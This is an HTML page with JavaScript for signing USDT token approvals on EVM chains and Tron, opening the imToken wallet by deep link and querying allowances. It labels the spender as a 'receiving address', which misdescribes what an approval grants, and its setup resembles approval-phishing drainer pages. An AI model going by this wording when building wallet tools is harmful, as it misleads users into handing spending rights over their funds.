<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="UTF-8">
  <title>支持 imToken 拉起 &amp; EVM/Tron Approve 示例</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <style>
    body { font-family: Arial, sans-serif; padding: 20px; }
    .section { border: 1px solid #ccc; padding: 15px; margin-bottom: 20px; }
    input{ padding:8px; margin: 5px 0; display: block; width: 95%; max-width: 400px; }
    button { padding: 8px; margin: 5px 0; display: block; width: 100%; max-width: 400px; }
    .radio-group { margin: 10px 0; }
    .radio-group label { margin-right: 15px; }
  </style>
</head>
<body>
  <h1>EVM/Tron Approve 授权</h1>
  
  
  <!-- 统一的 Token Approve 部分 -->
  <div class="section" id="unifiedSection">    
    <div id="networkInfo">正在检测网络...</div>
    <div id="walletInfo">未连接钱包</div>
    
    <label>Token 合约地址: <input type="text" id="tokenAddress" value="TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"  placeholder="USDT合约地址" style="background-color: #f0f0f0;"></label>
    <label>收款地址 (Spender): <input type="text" id="spenderAddress" placeholder="输入收款地址..."></label>
    <label>批准额度 (整数): <input type="text" id="approveAmount" placeholder="例如：1000000000000000000"></label>
    <button id="approveBtn">授权</button>
    <div id="approveResult"></div>
    
    <!-- 添加查询授权记录功能 -->
    <div style="margin-top: 20px; border-top: 1px solid #ddd; padding-top: 15px;">
      <h3>查询授权记录</h3>
      <p>查询当前钱包地址对该Token的授权情况</p>
      <button id="queryAllowanceBtn">查询当前授权</button>
      <button id="queryHistoryBtn">查询授权历史</button>
      <div id="allowanceResult" style="margin-top: 10px; padding: 10px; border: 1px solid #eee; min-height: 50px; max-height: 300px; overflow-y: auto; background-color: #f9f9f9;"></div>
    </div>
  </div>
  
  <!-- 引入所需库 -->
  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/tronweb@2.7.0/dist/TronWeb.min.js"></script>
  
  <script>
    /***********************
     * 统一的钱包连接和Approve部分 *
     ***********************/
    let web3, evmAccount, tronAccount;
    let detectedNetworkType = null;
    
    // 各网络USDT合约地址
    const TRON_USDT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // TRON上的USDT
    const ETH_USDT_ADDRESS = "0xdac17f958d2ee523a2206206994597c13d831ec7"; // 以太坊上的USDT
    const BSC_USDT_ADDRESS = "0x55d398326f99059ff775485246999027b3197955"; // BSC上的USDT/BUSD
    const POLYGON_USDT_ADDRESS = "0xc2132d05d31c914a87c6611c10748aeb04b58e8f"; // Polygon上的USDT
    
    // 自动检测网络环境
    async function detectWalletEnvironment() {
      const networkInfo = document.getElementById('networkInfo');
      const tokenAddressInput = document.getElementById('tokenAddress');
      
      // 检查是否有 TronWeb
      if (typeof window.tronWeb !== 'undefined' && window.tronWeb.ready) {
        networkInfo.innerText = "已检测到 TRON 网络";
        // 设置TRON网络的USDT合约地址
        tokenAddressInput.value = TRON_USDT_ADDRESS;
        detectedNetworkType = 'tron';
        return 'tron';
      }
      
      // 检查是否有 EVM 钱包
      if (typeof window.ethereum !== 'undefined') {
        try {
          const chainId = await window.ethereum.request({ method: 'eth_chainId' });
          let networkName = "EVM";
          
          // 根据chainId识别常见网络
          switch(chainId) {
            case '0x1': 
              networkName = "以太坊主网"; 
              // 设置ETH主网的USDT合约地址
              tokenAddressInput.value = ETH_USDT_ADDRESS;
              break;
            case '0x38': 
              networkName = "BSC主网"; 
              // 设置BSC的USDT合约地址
              tokenAddressInput.value = BSC_USDT_ADDRESS;
              break;
            case '0x89': 
              networkName = "Polygon网络"; 
              // 设置Polygon的USDT合约地址
              tokenAddressInput.value = POLYGON_USDT_ADDRESS;
              break;
            default: 
              networkName = `EVM网络(链ID:${chainId})`;
              // 默认使用ETH的USDT地址
              tokenAddressInput.value = ETH_USDT_ADDRESS;
          }
          
          networkInfo.innerText = `已检测到 ${networkName}`;
          detectedNetworkType = 'evm';
          return 'evm';
        } catch (e) {
          console.error("获取链ID失败:", e);
          networkInfo.innerText = "已检测到 EVM 网络";
          // 默认使用ETH的USDT地址
          tokenAddressInput.value = ETH_USDT_ADDRESS;
          detectedNetworkType = 'evm';
          return 'evm';
        }
      }
      
      networkInfo.innerText = "未检测到支持的网络环境";
      return null;
    }
    
    // 页面加载完成后自动检测环境
    window.addEventListener('DOMContentLoaded', async function() {
      await detectWalletEnvironment();
    });
    
    // 等待 TronWeb 对象注入且 ready 为 true（最多等待 10 秒）
    async function waitForTronWeb(timeout = 10000) {
      const startTime = Date.now();
      return new Promise((resolve) => {
        const interval = setInterval(() => {
          if (window.tronWeb && window.tronWeb.ready) {
            clearInterval(interval);
            resolve(true);
          } else if (Date.now() - startTime > timeout) {
            clearInterval(interval);
            resolve(false);
          }
        }, 500);
      });
    }
    
    // 连接EVM钱包
    async function connectEVMWallet() {
      const walletInfo = document.getElementById('walletInfo');
      
      if (typeof window.ethereum === 'undefined') {
        walletInfo.innerText = "未检测到 EVM 钱包";
        return null;
      }
      
      try {
        await window.ethereum.request({ method: 'eth_requestAccounts' });
        web3 = new Web3(window.ethereum);
        const accounts = await web3.eth.getAccounts();
        evmAccount = accounts[0];
        walletInfo.innerText = "已连接EVM钱包地址: " + evmAccount;
        
        console.log("EVM wallet connected:", evmAccount);
        return evmAccount;
      } catch (error) {
        walletInfo.innerText = "连接EVM钱包失败: " + error.message;
        console.error("EVM wallet connection error:", error);
        return null;
      }
    }
    
    // 连接TRON钱包
    async function connectTRONWallet() {
      const walletInfo = document.getElementById('walletInfo');
      
      if (typeof window.tronWeb === 'undefined') {
        walletInfo.innerText = "未检测到 TRON 钱包";
        return null;
      }
      
      try {
        const ready = await waitForTronWeb();
        if (ready) {
          tronAccount = window.tronWeb.defaultAddress.base58;
          walletInfo.innerText = "已连接TRON钱包地址: " + tronAccount;
          
          console.log("Tron wallet connected:", tronAccount);
          return tronAccount;
        } else {
          walletInfo.innerText = "TRON钱包未准备好，请稍后重试";
          return null;
        }
      } catch (error) {
        walletInfo.innerText = "连接TRON钱包失败: " + error.message;
        console.error("TRON wallet connection error:", error);
        return null;
      }
    }
    
    // 一键执行授权操作（包含检测环境、连接钱包、执行授权）
    document.getElementById('approveBtn').addEventListener('click', async function() {
      const tokenAddress = document.getElementById('tokenAddress').value.trim();
      const spenderAddress = document.getElementById('spenderAddress').value.trim();
      const approveAmount = document.getElementById('approveAmount').value.trim();
      const resultDiv = document.getElementById('approveResult');
      
      if (!spenderAddress || !approveAmount) {
        resultDiv.innerText = "请填写收款地址和授权额度";
        return;
      }
      
      // 检查是否在imToken内置浏览器中
      const isInImToken = 
        navigator.userAgent.includes('imToken') || 
        (typeof window.ethereum !== 'undefined' && window.ethereum.isImToken) ||
        (typeof window.tronWeb !== 'undefined' && window.tronWeb.isImToken);
      
      // 如果不在imToken中，尝试拉起imToken
      if (!isInImToken) {
        resultDiv.innerText = "检测到未在imToken中，正在尝试拉起imToken...";
        // 获取当前页面URL
        const currentUrl = window.location.href;
        // 构造imToken deep link
        const deepLink = "imtokenv2://navigate/DappView?url=" + encodeURIComponent(currentUrl);
        // 拉起imToken应用
        window.location.href = deepLink;
        return;
      }
      
      // 如果未检测到网络类型，重新检测
      if (!detectedNetworkType) {
        detectedNetworkType = await detectWalletEnvironment();
        if (!detectedNetworkType) {
          resultDiv.innerText = "未检测到支持的网络环境，请确保已安装imToken或其他支持的钱包";
          return;
        }
      }
      
      // 根据检测到的网络类型连接钱包
      let connectedAccount = null;
      if (detectedNetworkType === 'evm') {
        if (!evmAccount) {
          connectedAccount = await connectEVMWallet();
          if (!connectedAccount) return;
        } else {
          connectedAccount = evmAccount;
        }
        
        // ERC20 最小 ABI，仅包含 approve 方法
        const erc20Abi = [
          {
            "constant": false,
            "inputs": [
              { "name": "_spender", "type": "address" },
              { "name": "_value", "type": "uint256" }
            ],
            "name": "approve",
            "outputs": [{ "name": "", "type": "bool" }],
            "type": "function"
          }
        ];
        
        try {
          resultDiv.innerText = "正在发起EVM授权交易...";
          const tokenContract = new web3.eth.Contract(erc20Abi, tokenAddress);
          tokenContract.methods.approve(spenderAddress, approveAmount)
            .send({ from: connectedAccount })
            .on('transactionHash', function(hash) {
              resultDiv.innerText = "交易已提交，交易哈希: " + hash;
              console.log("EVM approve tx hash:", hash);
            })
            .on('error', function(error) {
              resultDiv.innerText = "调用 approve 失败: " + error.message;
              console.error("EVM approve error:", error);
            });
        } catch (error) {
          resultDiv.innerText = "调用 approve 异常: " + error.message;
          console.error("EVM approve exception:", error);
        }
      } else if (detectedNetworkType === 'tron') {
        if (!tronAccount) {
          connectedAccount = await connectTRONWallet();
          if (!connectedAccount) return;
        } else {
          connectedAccount = tronAccount;
        }
        
        try {
          resultDiv.innerText = "正在发起TRON授权交易...";
          const tokenContract = await window.tronWeb.contract().at(tokenAddress);
          const tx = await tokenContract.increaseApproval(spenderAddress, approveAmount).send({ feeLimit: 100000000 });
          resultDiv.innerText = "交易已提交，交易 ID: " + tx;
          console.log("Tron approve tx:", tx);
        } catch (error) {
          resultDiv.innerText = "调用 increaseApproval 失败: " + error.message;
          console.error("Tron increaseApproval error:", error);
        }
      }
    });
    
    // 查询当前授权额度
    document.getElementById('queryAllowanceBtn').addEventListener('click', async function() {
      const allowanceResultDiv = document.getElementById('allowanceResult');
      const tokenAddress = document.getElementById('tokenAddress').value.trim();
      
      if (!tokenAddress) {
        allowanceResultDiv.innerText = "请输入Token合约地址";
        return;
      }
      
      // 确保已连接钱包
      if (detectedNetworkType === 'evm') {
        if (!evmAccount) {
          await connectEVMWallet();
          if (!evmAccount) {
            allowanceResultDiv.innerText = "请先连接EVM钱包";
            return;
          }
        }
        
        // 获取所有已授权的地址(这很难在EVM链上直接实现，需要使用第三方API或索引服务)
        allowanceResultDiv.innerHTML = `<p>EVM网络暂不支持查询全部授权记录，请输入特定地址查询授权额度。</p>`;
        
        const spenderAddress = document.getElementById('spenderAddress').value.trim();
        if (spenderAddress) {
          try {
            allowanceResultDiv.innerHTML += "<p>正在查询授权额度...</p>";
            
            // ERC20 allowance方法的ABI
            const erc20Abi = [
              {
                "constant": true,
                "inputs": [
                  { "name": "_owner", "type": "address" },
                  { "name": "_spender", "type": "address" }
                ],
                "name": "allowance",
                "outputs": [{ "name": "", "type": "uint256" }],
                "type": "function"
              }
            ];
            
            const tokenContract = new web3.eth.Contract(erc20Abi, tokenAddress);
            const allowance = await tokenContract.methods.allowance(evmAccount, spenderAddress).call();
            
            allowanceResultDiv.innerHTML += `<p>地址 <strong>${spenderAddress}</strong> 被授权额度: <strong>${allowance}</strong></p>`;
          } catch (error) {
            allowanceResultDiv.innerHTML += `<p style="color:red">查询授权失败: ${error.message}</p>`;
            console.error("查询EVM授权失败:", error);
          }
        }
      } else if (detectedNetworkType === 'tron') {
        if (!tronAccount) {
          await connectTRONWallet();
          if (!tronAccount) {
            allowanceResultDiv.innerText = "请先连接TRON钱包";
            return;
          }
        }
        
        try {
          allowanceResultDiv.innerHTML = "<p>正在查询授权记录...</p>";
          
          const spenderAddress = document.getElementById('spenderAddress').value.trim();
          if (spenderAddress) {
            // 查询特定地址的授权额度
            const contract = await window.tronWeb.contract().at(tokenAddress);
            const allowance = await contract.allowance(tronAccount, spenderAddress).call();
            
            allowanceResultDiv.innerHTML = `<p>地址 <strong>${spenderAddress}</strong> 被授权额度: <strong>${allowance}</strong></p>`;
          } else {
            allowanceResultDiv.innerHTML = "<p>请输入要查询的收款地址(Spender)</p>";
          }
        } catch (error) {
          allowanceResultDiv.innerHTML = `<p style="color:red">查询授权失败: ${error.message}</p>`;
          console.error("查询TRON授权失败:", error);
        }
      } else {
        allowanceResultDiv.innerText = "未检测到支持的网络环境";
      }
    });
    
    // 查询授权历史记录
    document.getElementById('queryHistoryBtn').addEventListener('click', async function() {
      const allowanceResultDiv = document.getElementById('allowanceResult');
      const tokenAddress = document.getElementById('tokenAddress').value.trim();
      
      if (!tokenAddress) {
        allowanceResultDiv.innerText = "请输入Token合约地址";
        return;
      }
      
      allowanceResultDiv.innerHTML = "<p>正在查询授权历史记录...</p>";
      
      if (detectedNetworkType === 'evm') {
        if (!evmAccount) {
          await connectEVMWallet();
          if (!evmAccount) {
            allowanceResultDiv.innerText = "请先连接EVM钱包";
            return;
          }
        }
        
        try {
          // ERC20 Approval事件的ABI
          const erc20Abi = [
            {
              "anonymous": false,
              "inputs": [
                { "indexed": true, "name": "owner", "type": "address" },
                { "indexed": true, "name": "spender", "type": "address" },
                { "indexed": false, "name": "value", "type": "uint256" }
              ],
              "name": "Approval",
              "type": "event"
            }
          ];
          
          const tokenContract = new web3.eth.Contract(erc20Abi, tokenAddress);
          
          // 获取过去的授权事件(注意：这可能会受到RPC节点的限制)
          const events = await tokenContract.getPastEvents('Approval', {
            filter: { owner: evmAccount },
            fromBlock: 0,
            toBlock: 'latest'
          });
          
          if (events && events.length > 0) {
            let html = `<p>已找到 ${events.length} 条授权记录:</p><ul>`;
            
            events.forEach(event => {
              const { owner, spender, value } = event.returnValues;
              html += `<li>授权地址: <strong>${spender}</strong>, 授权额度: <strong>${value}</strong>, 区块: ${event.blockNumber}</li>`;
            });
            
            html += `</ul>`;
            allowanceResultDiv.innerHTML = html;
          } else {
            allowanceResultDiv.innerHTML = "<p>未找到授权记录</p>";
          }
        } catch (error) {
          allowanceResultDiv.innerHTML = `<p style="color:red">查询授权历史失败: ${error.message}</p>`;
          console.error("查询EVM授权历史失败:", error);
        }
      } else if (detectedNetworkType === 'tron') {
        if (!tronAccount) {
          await connectTRONWallet();
          if (!tronAccount) {
            allowanceResultDiv.innerText = "请先连接TRON钱包";
            return;
          }
        }
        
        try {
          // TronWeb不直接提供事件查询，需要使用TRON API
          allowanceResultDiv.innerHTML = "<p>正在查询TRON授权历史记录...</p>";
          
          const apiUrl = `https://apilist.tronscan.org/api/contract/events?contract=${tokenAddress}&event_name=Approval&ownAddr=${tronAccount}&limit=50`;
          
          // 使用fetch API替代Node.js代码中的请求
          fetch(apiUrl)
            .then(response => response.json())
            .then(data => {
              if (data && data.data && data.data.length > 0) {
                let html = `<p>已找到 ${data.data.length} 条授权记录:</p><ul>`;
                
                data.data.forEach(event => {
                  const spender = event.result._spender || event.result.spender;
                  const value = event.result._value || event.result.value;
                  const blockNumber = event.block;
                  
                  html += `<li>授权地址: <strong>${spender}</strong>, 授权额度: <strong>${value}</strong>, 区块: ${blockNumber}</li>`;
                });
                
                html += `</ul>`;
                allowanceResultDiv.innerHTML = html;
              } else {
                allowanceResultDiv.innerHTML = "<p>未找到授权记录</p>";
              }
            })
            .catch(error => {
              allowanceResultDiv.innerHTML = `<p style="color:red">查询TRON授权历史失败: ${error.message}</p>`;
              console.error("查询TRON授权历史API失败:", error);
            });
        } catch (error) {
          allowanceResultDiv.innerHTML = `<p style="color:red">查询TRON授权历史失败: ${error.message}</p>`;
          console.error("查询TRON授权历史失败:", error);
        }
      } else {
        allowanceResultDiv.innerText = "未检测到支持的网络环境";
      }
    });
  </script>
</body>
</html>